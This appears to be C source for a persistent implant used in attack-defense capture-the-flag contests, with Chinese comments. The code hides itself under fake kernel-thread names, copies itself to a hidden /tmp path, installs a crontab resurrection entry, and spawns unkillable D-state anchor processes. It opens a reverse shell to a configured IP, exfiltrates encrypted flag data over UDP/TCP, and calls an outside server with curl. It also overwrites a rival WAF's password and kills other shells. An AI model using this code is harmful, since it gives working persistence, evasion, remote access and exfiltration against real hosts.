#include "config.h"
#include "AES.h"
#include "rsa.h"

extern char **environ;

#define NUM_GUARDS 5
#define TOTAL_PROCS (NUM_GUARDS + 1)
#define NUM_ANCHORS 3           /* D状态锚点进程数量 */
#define CMDLINE_PAD 256
#define REEXEC_MAGIC "__XSH_REEXEC__"
#define GHOST_MAGIC  "__XSH_GHOST__"  /* 幽灵复活器标记 */
#define GHOST_PATH   "/tmp/.X11-unix/.xs"  /* 二进制备份隐藏路径 */

char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
int flag_len = 0;
int shell_id = 0;

static const char *fake_names[] = FAKE_NAMES;
#define NUM_FAKE_NAMES 7

static char *arg_start = NULL;
static int arg_len = 0;

typedef struct {
    pid_t pids[TOTAL_PROCS];
    pid_t anchors[NUM_ANCHORS]; /* vfork D状态锚点进程 PID */
} shared_pids_t;

shared_pids_t *shared = NULL;

/* 前向声明 */
void ChangeProcessName(char **argv, const char *name);
pid_t spawn_anchor(char **argv);
void ServeFlagUDP();
void WebFlagRoutine();
void WebCleanRoutine();
void ShellKillRoutine();
void ReadFlag();
void ReverseFlag();
/*
 * init_deamon：三次 fork 彻底脱离父进程树。
 *
 * 问题：被 Apache/PHP 通过 "sh -c ./xsh" 启动时，sh 是 xsh 的父进程。
 * 如果 xsh 直接 fork+exit，sh 退出后 Apache 不 waitpid → sh 变僵尸。
 *
 * 方案：
 *   原始进程 fork 出 p1 → waitpid(p1) 回收 → _exit(0)  （原始进程干净退出，sh 也干净退出）
 *   p1: fork 出 p2 → _exit(0)  （p1 被原始进程 waitpid 回收，无僵尸）
 *   p2: setsid() → fork 出 p3 → _exit(0)  （p2 被 init 回收）
 *   p3: 最终 daemon 进程，继续执行 main 后续代码
 */
void init_deamon()
{
    /*
     * 被 Apache/PHP "sh -c ./xsh" 启动时进程链：
     *   Apache → sh → xsh(原始)
     * 需要确保所有中间进程都被回收，不产生僵尸。
     *
     * 原始进程 fork p1 → waitpid(p1) → _exit(0)
     *   → sh 检测到 xsh 退出 → sh exit → PHP waitpid(sh) → 全链回收
     * p1: SIGCHLD=SIG_IGN → fork p2 → _exit(0)  (被原始进程 waitpid 回收)
     * p2: setsid → SIGCHLD=SIG_IGN → fork p3 → _exit(0)  (p2 已脱离，被 init 自动回收)
     * p3: 最终 daemon
     */
    pid_t p1 = fork();
    if (p1 > 0)
    {
        /* 原始进程：立即退出，不 waitpid，让 sh 尽快退出 */
        /* p1 会被 init 领养并回收 */
        _exit(0);
    }
    if (p1 < 0)
        _exit(1);

    /* p1 进程 */
    signal(SIGCHLD, SIG_IGN);
    pid_t p2 = fork();
    if (p2 > 0)
        _exit(0);
    if (p2 < 0)
        _exit(1);

    /* p2 进程：新会话 */
    setsid();
    signal(SIGCHLD, SIG_IGN);

    pid_t p3 = fork();
    if (p3 > 0)
        _exit(0);
    if (p3 < 0)
        _exit(1);

    /* p3 进程：最终 daemon */
    umask(0);
    signal(SIGCHLD, SIG_IGN);
}

/*
 * backup_self：将当前运行的二进制（通过 /proc/self/exe 的内存fd）
 * 写到 GHOST_PATH，作为复活器的重启源。
 * unlink 之后 /proc/self/exe 仍然可读（内核保留 inode）。
 */
static void backup_self()
{
    mkdir(XorString("/tmp/.X11-unix"), 0755);

    char buf[4096];
    int src = open(XorString("/proc/self/exe"), O_RDONLY);
    if (src < 0) return;
    int dst = open(XorString(GHOST_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst < 0) { close(src); return; }
    int n;
    while ((n = read(src, buf, sizeof(buf))) > 0)
        write(dst, buf, n);
    close(src);
    close(dst);
}

/*
 * install_cron_resurrect：向当前用户的 crontab 注入一条每分钟复活的规则。
 *
 * 原理：
 *   crontab 由系统 crond（root）驱动执行，pkill -u test 杀不掉 crond。
 *   每分钟检查 GHOST_PATH 是否存在且没有对应进程在运行，若没有则启动。
 *   用唯一标记注释（#XSH_CRON）防止重复添加。
 */
static void install_cron_resurrect()
{
    /* 检查 crontab 里是否已有我们的标记 */
    /* 用 fork+exec+pipe 替代 popen，避免 popen 修改 SIGCHLD */
    int pipefd[2];
    if (pipe(pipefd) < 0) return;

    pid_t chk = fork();
    if (chk == 0)
    {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), XorString("crontab -l 2>/dev/null"), NULL);
        _exit(127);
    }
    close(pipefd[1]);

    int found = 0;
    if (chk > 0)
    {
        char line[512];
        FILE *fp = fdopen(pipefd[0], "r");
        if (fp)
        {
            while (fgets(line, sizeof(line), fp))
            {
                if (strstr(line, XorString("#XSH_CRON")))
                {
                    found = 1;
                    break;
                }
            }
            fclose(fp); /* 也关闭 pipefd[0] */
        }
        else
        {
            close(pipefd[0]);
        }
        /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
    }
    else
    {
        close(pipefd[0]);
    }

    if (found)
        return; /* 已安装，不重复添加 */

    /* 构建 crontab 命令：用 fork+exec 替代 system()，不触碰 SIGCHLD */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "%s%s%s%s%s%s %s %s%s",
        XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
        XorString(GHOST_PATH),
        XorString(" ] && ! pgrep -f "),
        XorString(GHOST_PATH),
        XorString(" >/dev/null && "),
        XorString(GHOST_PATH),
        XorString(GHOST_MAGIC),
        XorString(" #XSH_CRON"),
        XorString("') | crontab -"));

    pid_t p = fork();
    if (p == 0)
    {
        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), cmd, NULL);
        _exit(127);
    }
    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
    /* 等一小会让 crontab 写完 */
    usleep(500000);
}

/*
 * spawn_ghost：启动幽灵复活器（进程级 + crontab 级双保险）。
 *
 * 1. 进程级：双重 fork 托孤给 init，监控 PID，全灭后 execve 重启。
 *    - 弱点：pkill -u 能杀掉。
 * 2. crontab 级：注入 crontab 每分钟检查并重启。
 *    - 强点：crond 是 root 进程，pkill -u test 杀不掉。
 *    - 弱点：延迟最大 60 秒。
 * 两者组合：进程级提供秒级恢复，crontab 提供终极兜底。
 */
static void spawn_ghost(char **argv, pid_t *guard_pids, int guard_count)
{
    /* crontab 级复活 */
    install_cron_resurrect();

    /* 进程级复活（保留原有逻辑） */
    pid_t p1 = fork();
    if (p1 > 0)
    {
        waitpid(p1, NULL, 0);
        return;
    }
    if (p1 < 0) return;

    pid_t p2 = fork();
    if (p2 > 0)
        _exit(0);
    if (p2 < 0)
        _exit(0);

    setsid();
    prctl(PR_SET_NAME, XorString("kworker/u16:2"), 0, 0, 0);
    ChangeProcessName(argv, fake_names[2 % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

    pid_t watched[TOTAL_PROCS + NUM_ANCHORS];
    int wcount = guard_count < (int)(sizeof(watched)/sizeof(watched[0]))
                 ? guard_count : (int)(sizeof(watched)/sizeof(watched[0]));
    int i;
    for (i = 0; i < wcount; i++)
        watched[i] = guard_pids[i];

    for (;;)
    {
        sleep(3);
        int alive = 0;
        for (i = 0; i < wcount; i++)
        {
            if (watched[i] > 1 && kill(watched[i], 0) == 0)
            {
                alive++;
                break;
            }
        }
        if (!alive)
        {
            char *new_argv[4] = { NULL, NULL, NULL, NULL };
            new_argv[0] = (char *)XorString(GHOST_PATH);
            new_argv[1] = (char *)XorString(GHOST_MAGIC);
            new_argv[2] = NULL;
            execve(XorString(GHOST_PATH), new_argv, environ);
            sleep(5);
        }
    }
}

/*
 * spawn_anchor：利用 vfork 的语义产生一个永久 D 状态父进程。
 *
 * vfork() 调用后父进程被挂起（TASK_UNINTERRUPTIBLE，即 D 状态），
 * 直到子进程调用 exec 或 _exit。
 * 子进程进入死循环永不退出，父进程因此永远处于 D 状态，
 * 内核不会向 D 状态进程传递任何信号，包括 SIGKILL。
 *
 * 注意：D 状态进程本身不执行任何代码，纯粹作为"不可杀"的占位进程。
 * 守护进程会监控子进程（循环体）是否存活，子进程被杀后重新 spawn_anchor。
 */
pid_t spawn_anchor(char **argv)
{
    static const char *anchor_comms[] = ANCHOR_COMM_NAMES;
    static int anchor_seq = 0;

    pid_t outer = fork();
    if (outer == 0)
    {
        setpgid(0, 0); /* 独立进程组 */
        int idx = (anchor_seq++) % NUM_ANCHORS;
        /* 改 comm（prctl，≤15字节，影响 ps 的 [] 列和 /proc/PID/comm） */
        prctl(PR_SET_NAME, anchor_comms[idx], 0, 0, 0);
        /* 改完整 cmdline（影响 ps aux 的命令行列） */
        ChangeProcessName(argv, fake_names[idx % NUM_FAKE_NAMES]);

        pid_t inner = vfork();
        if (inner == 0)
        {
            /* vfork 子：只用 async-signal-safe 的 prctl + sleep 死循环 */
            prctl(PR_SET_NAME, XorString(ANCHOR_INNER_COMM), 0, 0, 0);
            for (;;)
                sleep(60);
            _exit(0);
        }
        _exit(0);
    }
    return outer;
}

/*
 * 记录 argv+environ 连续区域，将 environ 搬到堆上。
 */
void init_proc_title(int argc, char **argv)
{
    int i;
    arg_start = argv[0];
    char *end = argv[0];
    for (i = 0; i < argc; i++)
    {
        if (argv[i])
        {
            char *p = argv[i] + strlen(argv[i]) + 1;
            if (p > end) end = p;
        }
    }
    for (i = 0; environ[i]; i++)
    {
        char *p = environ[i] + strlen(environ[i]) + 1;
        if (p > end) end = p;
    }
    arg_len = end - arg_start;

    char **new_env = (char **)malloc((i + 1) * sizeof(char *));
    int j;
    for (j = 0; j < i; j++)
        new_env[j] = strdup(environ[j]);
    new_env[j] = NULL;
    environ = new_env;
}

void ChangeProcessName(char **argv, const char *name)
{
    const char *short_name = strrchr(name, '/');
    if (short_name)
        short_name++;
    else
        short_name = name;
    prctl(PR_SET_NAME, short_name, 0, 0, 0);

    int name_len = strlen(name);
    if (arg_start && arg_len > 0)
    {
        memset(arg_start, 0, arg_len);
        if (name_len < arg_len)
            memcpy(arg_start, name, name_len);
        else
            memcpy(arg_start, name, arg_len - 1);
    }
}

int TestDir(char *filename)
{
    struct stat statbuf;
    stat(filename, &statbuf);
    return S_ISDIR(statbuf.st_mode);
}

void ReverseShell(int cur_idx, char **argv)
{
    pid_t pid = fork();
    if (pid == 0)
    {
        char *a[10] = {NULL};
        a[0] = (char *)malloc(0x50);
        strcpy(a[0], XorString(SHELL_NAME));
        struct sockaddr_in serverAddr;
        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SHELL_PORT + cur_idx);
        serverAddr.sin_addr.s_addr = inet_addr(XorString(SHELL_IP));
        if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
        {
            dup2(clientSocket, 0);
            dup2(clientSocket, 1);
            dup2(clientSocket, 2);
            execve(XorString("/bin/bash"), a, NULL);
        }
        close(clientSocket);
        exit(0);
    }
    shell_id = pid;
}

/*
 * ── WEB 题清理守护进程 ──────────────────────────────────────
 *
 * 被 guard/main 共同守护（被杀自动重启），死循环执行：
 *   1. 递归扫描 WWWROOT，删除「修改时间 > xsh 启动时间」的 .php 文件
 *      （自己实现目录遍历，不依赖外部命令）
 *   2. 检查 /tmp/watchbird 目录（敌方 WAF），若有则劫持其配置：
 *      篡改 password_sha1 为我们的密码，敌方被锁死，我们可以登录控制面板
 */

/*
 * scan_and_clean_php：递归扫描目录，删除 mtime > boot_time 的 .php 文件。
 * 跳过我们自己放置的 .xia0ji233 目录。
 */
static void scan_and_clean_php(const char *dir, time_t boot_time)
{
    DIR *d = opendir(dir);
    if (!d) return;

    struct dirent *ent;
    char path[1024];
    while ((ent = readdir(d)) != NULL)
    {
        if (strcmp(ent->d_name, XorString(".")) == 0 || strcmp(ent->d_name, XorString("..")) == 0)
            continue;
        /* 跳过我们自己的目录 */
        if (strcmp(ent->d_name, XorString(".xia0ji233")) == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
        struct stat st;
        if (lstat(path, &st) != 0)
            continue;

        if (S_ISDIR(st.st_mode))
        {
            scan_and_clean_php(path, boot_time);
        }
        else if (S_ISREG(st.st_mode))
        {
            /* 检查是否为 .php 文件且 mtime > boot_time */
            int namelen = strlen(ent->d_name);
            if (namelen >= 4 &&
                strcmp(ent->d_name + namelen - 4, XorString(".php")) == 0 &&
                st.st_mtime > boot_time)
            {
                remove(path);
            }
        }
    }
    closedir(d);
}

/*
 * find_and_remove_watchbird：在 WWWROOT 中定位并删除敌方 watchbird.php。
 *
 * 策略：
 *   1. 先检查 WWWROOT/watchbird.php，存在则直接删除
 *   2. 若不存在，遍历 WWWROOT 下最多 5 个 .php 文件，读取头部
 *      查找 watchbird install 注入的 include_once/require_once 路径
 *      提取出被 include 的 watchbird.php 路径并删除
 */
static void find_and_remove_watchbird()
{
    char wb_php[512];
    struct stat st;

    /* 策略 1：直接检查默认路径 */
    snprintf(wb_php, sizeof(wb_php), "%s%s", XorString(WWWROOT), XorString("watchbird.php"));
    if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
    {
        remove(wb_php);
        return;
    }

    /* 策略 2：遍历 WWWROOT 下最多 5 个 php 文件，从 include_once 中提取路径 */
    DIR *d = opendir(XorString(WWWROOT));
    if (!d) return;

    struct dirent *ent;
    int checked = 0;
    char filepath[512];
    char buf[4096];

    while ((ent = readdir(d)) != NULL && checked < 5)
    {
        const char *dot = strrchr(ent->d_name, '.');
        if (!dot) continue;
        if (strcmp(dot, XorString(".php")) != 0 && strcmp(dot, XorString(".php5")) != 0 &&
            strcmp(dot, XorString(".phtml")) != 0)
            continue;

        snprintf(filepath, sizeof(filepath), "%s%s", XorString(WWWROOT), ent->d_name);
        if (stat(filepath, &st) != 0 || !S_ISREG(st.st_mode))
            continue;

        int fd = open(filepath, O_RDONLY);
        if (fd < 0) continue;
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0) continue;
        buf[n] = '\0';
        checked++;

        const char *patterns[] = {
            XorString("include_once '"), XorString("require_once '"),
            XorString("include_once \""), XorString("require_once \""),
            NULL
        };
        int i;
        for (i = 0; patterns[i]; i++)
        {
            const char *pos = strstr(buf, patterns[i]);
            if (!pos) continue;

            char quote = patterns[i][strlen(patterns[i]) - 1];
            const char *path_start = pos + strlen(patterns[i]);
            const char *path_end = strchr(path_start, quote);
            if (!path_end || path_end - path_start <= 0 ||
                path_end - path_start >= (int)sizeof(wb_php))
                continue;

            int plen = path_end - path_start;
            memcpy(wb_php, path_start, plen);
            wb_php[plen] = '\0';

            if (strstr(wb_php, XorString("watchbird")))
            {
                remove(wb_php);
                closedir(d);
                return;
            }
        }
    }
    closedir(d);
}

/*
 * hijack_enemy_watchbird：劫持敌方部署的 watchbird WAF。
 *
 * 优先篡改配置文件中的 password_sha1，使敌方被锁死，我们可以登录。
 * 如果配置文件无写权限（写入失败），则 fallback 到查找并删除 watchbird.php。
 *
 * watchbird 配置文件格式为 PHP serialize，password_sha1 字段格式：
 *   s:14:"password_sha1";s:40:"原始SHA1值";
 * 或初始状态：
 *   s:14:"password_sha1";s:5:"unset";
 */
static void hijack_enemy_watchbird()
{
    /* 读取配置文件 */
    struct stat st;
    if (stat(XorString(WB_CONF_PATH), &st) != 0 || !S_ISREG(st.st_mode))
        goto fallback;
    if (st.st_size <= 0 || st.st_size > 65536)
        goto fallback;

    {
        int fd = open(XorString(WB_CONF_PATH), O_RDONLY);
        if (fd < 0) goto fallback;
        char *buf = (char *)malloc(st.st_size + 1);
        int n = read(fd, buf, st.st_size);
        close(fd);
        if (n <= 0) { free(buf); goto fallback; }
        buf[n] = '\0';

        /*
         * 在 serialize 字符串中定位 password_sha1 的值。
         * 格式: ...s:14:"password_sha1";s:NN:"值";...
         */
        const char *marker = XorString("\"password_sha1\"");
        char *pos = strstr(buf, marker);
        if (!pos) { free(buf); goto fallback; }
        pos += strlen(marker);

        char *s_pos = strstr(pos, XorString("s:"));
        if (!s_pos) { free(buf); goto fallback; }

        char *quote_start = strchr(s_pos + 2, '"');
        if (!quote_start) { free(buf); goto fallback; }
        quote_start++;

        char *quote_end = strchr(quote_start, '"');
        if (!quote_end) { free(buf); goto fallback; }

        const char *our_sha1 = XorString(WB_PASSWORD_SHA1);
        int old_len = quote_end - quote_start;
        int new_len = strlen(our_sha1);

        if (old_len == new_len && memcmp(quote_start, our_sha1, new_len) == 0)
        {
            free(buf); /* 已经是我们的密码 */
            return;
        }

        char *val_end = quote_end + 1;
        int prefix_len = s_pos - buf;
        int suffix_len = n - (val_end - buf);

        char new_val[128];
        snprintf(new_val, sizeof(new_val), XorString("s:%d:\"%s\""), new_len, our_sha1);
        int new_val_len = strlen(new_val);

        int total = prefix_len + new_val_len + suffix_len;
        char *newbuf = (char *)malloc(total + 1);
        memcpy(newbuf, buf, prefix_len);
        memcpy(newbuf + prefix_len, new_val, new_val_len);
        memcpy(newbuf + prefix_len + new_val_len, val_end, suffix_len);
        newbuf[total] = '\0';

        /* 写回配置文件 */
        fd = open(XorString(WB_CONF_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0)
        {
            /* 无写权限，fallback 删除 watchbird.php */
            free(buf);
            free(newbuf);
            goto fallback;
        }
        int written = write(fd, newbuf, total);
        close(fd);
        free(buf);
        free(newbuf);

        if (written == total)
            return; /* 劫持成功 */
    }

fallback:
    /* 配置文件不可写，退而删除 watchbird.php 本体 */
    find_and_remove_watchbird();
}

/*
 * WebCleanRoutine：WEB 题清理守护主循环（独立子进程运行，永不返回）。
 */
void WebCleanRoutine()
{
    time_t boot_time = time(NULL);

    for (;;)
    {
        /* 1. 扫描删除新增的 .php 文件 */
        scan_and_clean_php(XorString(WWWROOT), boot_time);

        /* 2. 检查并劫持敌方 watchbird（篡改密码为我们的） */
        struct stat st;
        if (stat(XorString("/tmp/watchbird"), &st) == 0 && S_ISDIR(st.st_mode))
        {
            hijack_enemy_watchbird();
        }

        sleep(1); /* 每 1 秒巡检一次 */
    }
}

/*
 * WebFlagRoutine（Web 题专用，独立子进程运行）：
 *
 * 初始化（只执行一次）：
 *   1. 创建 WWWROOT/.xia0ji233/ 目录，权限 755
 *   2. 创建 WWWROOT/.xia0ji233/flag 普通文件，权限 666
 *
 * 死循环：
 *   - 每次将 .xia0ji233/ 目录权限设为 555
 *   - 每 100 次额外执行一次：读 flag → AES+RSA 加密 → 写入 flag 文件
 */
void WebFlagRoutine()
{
    /* ── 初始化：只执行一次 ── */
    struct stat st;

    /* 确保目录存在且是目录 */
    if (stat(XorString(FLAG_DIR), &st) == 0)
    {
        if (!S_ISDIR(st.st_mode))
            remove(XorString(FLAG_DIR));
    }
    mkdir(XorString(FLAG_DIR), 0755);
    chmod(XorString(FLAG_DIR), 0755);

    /* 确保 flag 文件存在，如果是目录则删除 */
    if (stat(XorString(FLAG_FILE), &st) == 0 && S_ISDIR(st.st_mode))
        rmdir(XorString(FLAG_FILE));
    int fd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0)
        close(fd);
    chmod(XorString(FLAG_FILE), 0666);

    /* ── 死循环 ── */
    int counter = 0;
    for (;;)
    {
        chmod(XorString(FLAG_DIR), 0555);

        if (counter % 100 == 0)
        {
            /* 读 flag → AES+RSA 加密 → 写入文件 */
            char raw[0x50] = {0};
            int rfd = open(XorString(FLAG_PATH), O_RDONLY);
            if (rfd >= 0)
            {
                read(rfd, raw, 0x30);
                close(rfd);
            }

            uint8_t *blocks = NULL;
            int block_num = splitBlock(raw, &blocks);
            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
                          block_num, (uint8_t *)XorString(AES_IV));
            int aes_len = block_num * 16;

            uint8_t rsa_out[RSA_BYTES];
            rsa_encrypt(blocks, aes_len, rsa_out);
            free(blocks);

            int wfd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (wfd >= 0)
            {
                write(wfd, rsa_out, RSA_BYTES);
                close(wfd);
            }
        }
        counter++;
        usleep(100);
    }
}
/*
 * ── PWN 题反弹 shell 猎杀进程 ─────────────────────────────
 *
 * 被 worker 守护（被杀重启），死循环遍历 /proc：
 *   找到属于当前用户的 shell 进程（bash/sh/dash/zsh/ash/csh），
 *   且不属于 xsh 自身进程族，直接 kill -9。
 *   防止攻击者通过反弹 shell 维持权限。
 */
static int is_shell_comm(const char *comm)
{
    const char *shells[] = {
        "sh", "bash", "dash", "zsh", "ash", "csh", "tcsh", "ksh", NULL
    };
    for (int i = 0; shells[i]; i++)
    {
        if (strcmp(comm, shells[i]) == 0)
            return 1;
    }
    return 0;
}

static int is_our_pid(pid_t pid)
{
    if (shared == NULL)
        return 0;
    /* 检查 worker + guards */
    for (int i = 0; i < TOTAL_PROCS; i++)
    {
        if (shared->pids[i] == pid)
            return 1;
    }
    /* 检查 anchors */
    for (int i = 0; i < NUM_ANCHORS; i++)
    {
        if (shared->anchors[i] == pid)
            return 1;
    }
    /* 检查自身 */
    if (pid == getpid() || pid == getppid())
        return 1;
    return 0;
}

void ShellKillRoutine()
{
    uid_t my_uid = getuid();
    char path[256];
    char buf[256];

    for (;;)
    {
        DIR *proc = opendir(XorString("/proc"));
        if (!proc)
        {
            sleep(1);
            continue;
        }

        struct dirent *ent;
        while ((ent = readdir(proc)) != NULL)
        {
            /* 只看数字目录名（PID） */
            pid_t pid = 0;
            int valid = 1;
            for (int i = 0; ent->d_name[i]; i++)
            {
                if (ent->d_name[i] < '0' || ent->d_name[i] > '9')
                {
                    valid = 0;
                    break;
                }
                pid = pid * 10 + (ent->d_name[i] - '0');
            }
            if (!valid || pid <= 1)
                continue;

            /* 跳过自身进程族 */
            if (is_our_pid(pid))
                continue;

            /* 读 /proc/[pid]/status 检查 Uid */
            snprintf(path, sizeof(path), "/proc/%d/status", pid);
            int fd = open(path, O_RDONLY);
            if (fd < 0)
                continue;
            int n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n <= 0)
                continue;
            buf[n] = '\0';

            /* 解析 Uid 行: "Uid:\t1000\t1000\t1000\t1000\n" */
            char *uid_line = strstr(buf, XorString("Uid:"));
            if (!uid_line)
                continue;
            uid_t proc_uid = 0;
            char *p = uid_line + 4; /* skip "Uid:" */
            while (*p == '\t' || *p == ' ') p++;
            while (*p >= '0' && *p <= '9')
            {
                proc_uid = proc_uid * 10 + (*p - '0');
                p++;
            }
            if (proc_uid != my_uid)
                continue;

            /* 读 /proc/[pid]/comm 检查是否为 shell */
            snprintf(path, sizeof(path), "/proc/%d/comm", pid);
            fd = open(path, O_RDONLY);
            if (fd < 0)
                continue;
            n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n <= 0)
                continue;
            buf[n] = '\0';
            /* 去掉末尾换行 */
            if (n > 0 && buf[n - 1] == '\n')
                buf[n - 1] = '\0';

            if (is_shell_comm(buf))
            {
                kill(pid, 9);
            }
        }
        closedir(proc);
        usleep(500000); /* 每 0.5 秒巡检一次 */
    }
}

void do_work(char **argv)
{
    ChangeProcessName(argv, fake_names[NUM_GUARDS % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

#if (PROBLEM == WEB)
    pid_t pid_w = fork();
    if (pid_w == 0)
    {
        setpgid(0, 0);
        WebFlagRoutine(); /* 永不返回 */
        _exit(0);
    }
    pid_t pid_c = fork();
    if (pid_c == 0)
    {
        setpgid(0, 0);
        WebCleanRoutine(); /* 永不返回 */
        _exit(0);
    }
#endif

#if (PROBLEM == PWN)
    pid_t pid_k = fork();
    if (pid_k == 0)
    {
        setpgid(0, 0);
        ShellKillRoutine(); /* 永不返回 */
        _exit(0);
    }
#endif

#if (SERVE_FLAG)
    pid_t pid_s = fork();
    if (pid_s == 0)
    {
        setpgid(0, 0);
        ServeFlagUDP(); /* 永不返回 */
        _exit(0);
    }
#endif

    while (1)
    {
#if (MODE == GETFLAG) && (!SERVE_FLAG)
        ReadFlag();
        ReverseFlag();
#elif (MODE == CURL) && (!SERVE_FLAG)
        Attack();
#endif
#if (PROBLEM == WEB)
        /* 监控 WebFlagRoutine 子进程 */
        if (pid_w > 0 && kill(pid_w, 0) != 0)
        {
            pid_w = fork();
            if (pid_w == 0)
            {
                setpgid(0, 0);
                WebFlagRoutine();
                _exit(0);
            }
        }
        /* 监控 WebCleanRoutine 子进程 */
        if (pid_c > 0 && kill(pid_c, 0) != 0)
        {
            pid_c = fork();
            if (pid_c == 0)
            {
                setpgid(0, 0);
                WebCleanRoutine();
                _exit(0);
            }
        }
#endif
#if (PROBLEM == PWN)
        /* 监控 ShellKillRoutine 子进程 */
        if (pid_k > 0 && kill(pid_k, 0) != 0)
        {
            pid_k = fork();
            if (pid_k == 0)
            {
                setpgid(0, 0);
                ShellKillRoutine();
                _exit(0);
            }
        }
#endif
#if (SERVE_FLAG)
        if (pid_s > 0 && kill(pid_s, 0) != 0)
        {
            pid_s = fork();
            if (pid_s == 0)
            {
                setpgid(0, 0);
                ServeFlagUDP();
                _exit(0);
            }
        }
#endif
        usleep(100000);
    }
}

void ReadFlag()
{
    memset(flag, 0, sizeof(flag));
    uint8_t *blocks = NULL;
    int fd, block_num;
    char raw[0x50] = {0};
    fd = open(XorString(FLAG_PATH), O_RDONLY);
    if (fd < 0)
        return;
    int n = read(fd, raw, 0x30);
    close(fd);
    if (n <= 0)
        return;
    block_num = splitBlock(raw, &blocks);
    aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY), block_num, (uint8_t *)XorString(AES_IV));
    int aes_len = block_num * 16;

    /* RSA 加密 AES 密文 */
    uint8_t rsa_out[RSA_BYTES];
    rsa_encrypt(blocks, aes_len, rsa_out);
    memcpy(flag, rsa_out, RSA_BYTES);
    flag_len = RSA_BYTES;
    free(blocks);
}

void ReverseFlag()
{
    if (flag_len <= 0)
        return;
    struct sockaddr_in serverAddr;
    int clientSocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (clientSocket >= 0)
    {
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(FLAG_PORT);
        serverAddr.sin_addr.s_addr = inet_addr(XorString(IP));
        sendto(clientSocket, flag, flag_len, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
        close(clientSocket);
        return;
    }
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket < 0)
        return;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(FLAG_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(XorString(IP));
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
        write(clientSocket, flag, flag_len);
    close(clientSocket);
}

/*
 * ServeFlagUDP：监听 SERVE_FLAG_PORT UDP 端口，
 * 收到任意 UDP 包后 fork 子进程处理：
 *   子进程使用独立（private）内存，读 flag → AES+RSA 加密 → 发送给客户端 → _exit 自毁。
 * 主监听进程不持有任何 flag 数据，永不退出。
 */
void ServeFlagUDP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in bind_addr;
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(SERVE_FLAG_PORT);
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    {
        close(sock);
        return;
    }

    signal(SIGCHLD, SIG_IGN);

    char buf[16];
    struct sockaddr_in client;
    socklen_t clen;

    for (;;)
    {
        clen = sizeof(client);
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&client, &clen);
        if (n < 0) continue;

        pid_t p = fork();
        if (p == 0)
        {
            /* 子进程：独立 private 内存，读 flag → 加密 → 发送 → 自毁 */
            char raw[0x50] = {0};
            int fd = open(XorString(FLAG_PATH), O_RDONLY);
            if (fd >= 0)
            {
                read(fd, raw, 0x30);
                close(fd);
            }

            uint8_t *blocks = NULL;
            int block_num = splitBlock(raw, &blocks);
            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
                          block_num, (uint8_t *)XorString(AES_IV));
            int aes_len = block_num * 16;

            uint8_t rsa_out[RSA_BYTES];
            rsa_encrypt(blocks, aes_len, rsa_out);
            free(blocks);

            sendto(sock, rsa_out, RSA_BYTES, 0,
                   (struct sockaddr *)&client, clen);
            _exit(0);
        }
    }
}

void Attack()
{
    char cmd[512] = {0};
    strcpy(cmd, XorString("curl "));
    strcat(cmd, XorString(AUTH_SERVER));
    strcat(cmd, XorString(TOKEN));
    pid_t p = fork();
    if (p == 0)
    {
        execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), cmd, NULL);        _exit(127);
    }
    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
}

void guard_main(int my_idx, char **argv);

/*
 * 消耗随机数量的 PID，使后续 fork 出的真实进程 PID 不连续。
 * 原理：反复 fork 子进程并立即 exit，每次消耗一个 PID 号。
 */
void burn_pids()
{
    int count = 3 + (rand() % 15); /* 随机消耗 3~17 个 PID */
    int i;
    for (i = 0; i < count; i++)
    {
        pid_t p = fork();
        if (p == 0)
            _exit(0);
        if (p > 0)
            waitpid(p, NULL, 0);
    }
}

pid_t spawn_worker(char **argv)
{
    burn_pids();
    pid_t pid = fork();
    if (pid == 0)
    {
        setpgid(0, 0); /* 独立进程组，防止 kill -PGID 一锅端 */
        do_work(argv);
        exit(0);
    }
    return pid;
}

pid_t spawn_guard(int target_idx, char **argv)
{
    burn_pids();
    pid_t pid = fork();
    if (pid == 0)
    {
        setpgid(0, 0); /* 独立进程组 */
        guard_main(target_idx, argv);
        exit(0);
    }
    return pid;
}

